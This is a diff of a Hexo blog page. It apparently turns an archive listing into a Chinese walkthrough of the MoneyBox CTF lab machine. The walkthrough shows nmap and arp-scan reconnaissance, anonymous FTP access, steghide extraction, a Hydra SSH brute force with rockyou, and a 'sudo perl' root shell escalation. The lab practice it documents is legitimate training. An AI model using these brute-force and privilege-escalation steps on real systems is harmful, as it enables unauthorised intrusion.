@@ -10,7 +10,7 @@
     
     
     
-    <title>archive_a | hexo</title>
+    <title>MoneyBox | hexo</title>
     <link href="http://example.com" rel="prefetch" />
 
     
@@ -107,7 +107,7 @@
                 
                 
                 
-                <li class="current">
+                <li class="">
                     <a href="/archives">
                         <i class="fa fa-archive"></i>归档
                     </a>
@@ -150,19 +150,27 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-8 gal-right" id="mainstay">
-                    <article class="article well article-body" id="article-archive">
+                    
+<article class="article well article-body" id="article">
     <div class="breadcrumb">
         <i class="fa fa-home"></i>
         <a href="http://example.com">hexo</a>
         >
-        <span>归档</span>
+        <span>MoneyBox</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/archives">归档</a>
+                <a href="/2024/01/08/MoneyBox/">MoneyBox</a>
             </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2024-01-08
+            </span>
+            
         </div>
     </div>
     <!-- 小型设备详细文章 -->
@@ -170,108 +178,118 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/archives">归档</a>
+                    <a href="/2024/01/08/MoneyBox/">MoneyBox</a>
                 </h4>
             </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2024-01-08
+            </p>
+            <p>
+                
+                
+            </p>
         </center>
     </div>
-    <div class="content-article" style="margin-top: 30px;">
-        
-        
-            <h1 style="font-size: 24px; margin-top: 40px;">2024年</h1>
-            
-        <div class="alert alert-info" style="font-size: 14px; line-height: 2; font-weight: bold;">
-            
-             
-             
-                        <a href="/2024/01/08/MoneyBox/">MoneyBox</a>
-                        <br>
-            
-             
-                        <a href="/2024/01/07/XinXiShouJi/">信息收集</a>
-                        <br>
-            
-             
-                        <a href="/2024/01/06/YuMing/">域名信息</a>
-                        <br>
-            
-             
-                        <a href="/2024/01/05/Nmap/">Nmap</a>
-                        <br>
-            
-             
-                        <a href="/2024/01/02/web_sentou/">web渗透</a>
-                        <br>
-            
-             
-                        </div>
-                    <h1 style="font-size: 24px; margin-top: 40px;">2023年</h1>
-                    <div class="alert alert-info" style="font-size: 14px; line-height: 2; font-weight: bold;">
-                 
-             
-                        <a href="/2023/12/25/sqli_labs/">sqli_labs</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/20/SQL_ZhuRu/">SQL注入</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/17/vue/">vue导入</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/17/phpstudy_mysql/">phpstudy的mysql服务开启</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/17/php_study/">php的一些基础知识</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/10/python_study1/">python_study</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/10/HTML5/">HTML5的基本知识</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/06/ssh_denglu_Linux/">ssh远程登陆Linux</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/04/linux_stduy/">Linux的学习</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/04/WangLuoAnQuanJiChu/">网络安全知识基础和Proxifier的使用</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/04/AhMyth_use/">Ahmyth的使用</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/03/tuchuang/">图床搭建</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/03/python/">python安装</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/03/daboke/">利用github搭博客</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/03/diaoyuyemianyouhua/">钓鱼页面优化</a>
-                        <br>
-            
-                    </div>
-        
+    <div class="content-article">
+        <h1 id="一、导入Debian-Custum-CTF靶场"><a href="#一、导入Debian-Custum-CTF靶场" class="headerlink" title="一、导入Debian Custum CTF靶场"></a>一、导入Debian Custum CTF靶场</h1><ol>
+<li><p>下载Orade VM VirtualBox和MoneyBox.ova</p>
+</li>
+<li><p>打开Orade VM VirtualBox,点击管理–导入虚拟电脑</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072251317.png" alt="image-20240107225148959"></p>
+</li>
+<li><p>选择MoneyBox.ova文件夹，点击下一步。</p>
+</li>
+<li><p>导入成功后，点击设置–网络,将连接方式改为仅主机网络，界面名称改为VirtualBox Host-Only Ethernet Adapter。再点击高级，记录MAC地址。</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072255919.png" alt="image-20240107225518849"></p>
+</li>
+<li><p>右键Debian Custim CTF启动–正常启动</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072257866.png" alt="image-20240107225722773"></p>
+</li>
+</ol>
+<h1 id="二、靶场练习"><a href="#二、靶场练习" class="headerlink" title="二、靶场练习"></a>二、靶场练习</h1><ol>
+<li><p>打开kali,点击编辑–虚拟网络编辑器，将桥接模式的已桥接至改为VirtualBox Host-Only Ethernet Adapter</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072303814.png" alt="image-20240107230318621"></p>
+</li>
+<li><p>打开终端，开启网卡</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig	//查看桥接的网卡名</span><br><span class="line">ifdown	//关闭网卡</span><br><span class="line">ifup	//开启网卡</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在本地网络上执行ARP扫描，会显示与桥接网卡接口的本地ip地址和MAC地址，正常会显示靶场的MAC地址。</p>
+<p><code>arp-scan -l -I ethp</code></p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072311052.png" alt="image-20240107231128666"></p>
+</li>
+<li><p>nmap扫描端口,查看开启的端口</p>
+<p><code>nmap  -p- 192.168.56.103 -sC</code></p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072315982.png" alt="image-20240107231558889"></p>
+</li>
+<li><p>发现ftp拥有允许匿名ftp登录的漏洞，Anonymous:Anonymous登录</p>
+<p><code>ftp 192.168.56.103</code></p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072320416.png" alt="image-20240107232043440"></p>
+</li>
+<li><p>查看目录和文件</p>
+<p><code>ls -al</code></p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072321487.png" alt="image-20240107232106579"></p>
+</li>
+<li><p>发现一张照片，使用get方法下载</p>
+<p><code>get trytofind.jpg</code></p>
+</li>
+<li><p>退出ftp的anonymous用户使用二进制查看图片代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">strings trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072326187.png" alt="image-20240107232636993"></p>
+</li>
+<li><p>发现在图片中夹杂着一些代码，使用steghide工具分离隐藏文件</p>
+<p><code>steghide info trytofind.jpg</code></p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072328400.png" alt="image-20240107232852380"></p>
+</li>
+<li><p>发现需要密钥，进行扫目录，寻找密钥</p>
+<p><code>dirsearch -u 192.168.56.103 -x 403,404</code></p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072331472.png" alt="image-20240107233137320"></p>
+</li>
+<li><p>发现一个blogs目录，网页访问查看源代码发现提示访问另一个网页S3cr3t-T3xt,访问192.168.56.103&#x2F;S3cr3t-T3xt&#x2F;，在源代码中发现一个Key。</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072334532.png" alt="image-20240107233435253"></p>
+</li>
+<li><p>返回kali，输入key，发现一个data.txt。</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072336857.png" alt="image-20240107233645294"></p>
+</li>
+<li><p>提取data.txt文件，cat data.txt查看内容</p>
+<p><code>steghide extract -sf trytofind.jpg</code></p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072339355.png" alt="image-20240107233957342"></p>
+</li>
+<li><p>发现一个用户名renu,并且密码为弱密码。使用Hydra工具暴力破解密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/wordlists	//一般kali字典存放处</span><br><span class="line">ls	//查看字典文件名</span><br><span class="line">hydra -l renu -P rockyou.txt.gz 192.168.56.103 ssh	//使用字段暴力破解</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072347494.png" alt="image-20240107234754557"></p>
+<ol start="15">
+<li><p>使用ssh登录renu用户</p>
+<p><code>ssh renu@192.168.56.103</code></p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072349723.png" alt="image-20240107234946787"></p>
+</li>
+</ol>
+</li>
+<li><p>查看文件名，发现.bash_history和user1.txt，cat查看两个文件</p>
+</li>
+<li><p>user1.txt存放着第一个flag。</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072351723.png" alt="image-20240107235137848"></p>
+</li>
+<li><p>查看历史记录发现一个lily的用户名，尝试的登录一下</p>
+<p><code>ssh lily@192.168.56.103</code></p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072353051.png" alt="image-20240107235340092"></p>
+</li>
+<li><p>成功登录后，查看文件名，发现user2.txt，cat查看发现里面有第二个flag。</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401072355700.png" alt="image-20240107235533832"></p>
+</li>
+<li><p>尝试进入root用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">sudo perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27;	//perl提权，且不需要密码</span><br><span class="line">cd /root</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看文件，发现.root.txt文件，查看发现有第三个flag</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202401080003321.png" alt="image-20240108000349193"></p>
+</li>
+</ol>
+
     </div>
 </article>
+
+
                 </div>
                 <aside class="col-md-4 gal-left" id="sidebar">
     <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
@@ -404,25 +422,13 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/03/diaoyuyemianyouhua/">钓鱼页面优化</a>
+                    <a href="/2023/12/03/python/">python安装</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/04/AhMyth_use/">Ahmyth的使用</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2023/12/06/ssh_denglu_Linux/">ssh远程登陆Linux</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2023/12/10/python_study1/">python_study</a>
+                    <a href="/2023/12/03/tuchuang/">图床搭建</a>
                 </span>
             </li>
             
@@ -440,7 +446,7 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/25/sqli_labs/">sqli_labs</a>
+                    <a href="/2023/12/20/SQL_ZhuRu/">SQL注入</a>
                 </span>
             </li>
             
@@ -462,6 +468,18 @@
                 </span>
             </li>
             
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/07/XinXiShouJi/">信息收集</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/08/MoneyBox/">MoneyBox</a>
+                </span>
+            </li>
+            
         </ul>
     </div>
 </aside>
@@ -473,17 +491,17 @@
 
                 
                 <li>
-                    <a href="/archives/2023/page/2/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2024/01/08/MoneyBox/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/archives/2023/page/2/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2024/01/08/MoneyBox/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/archives/2023/page/2/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2024/01/08/MoneyBox/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
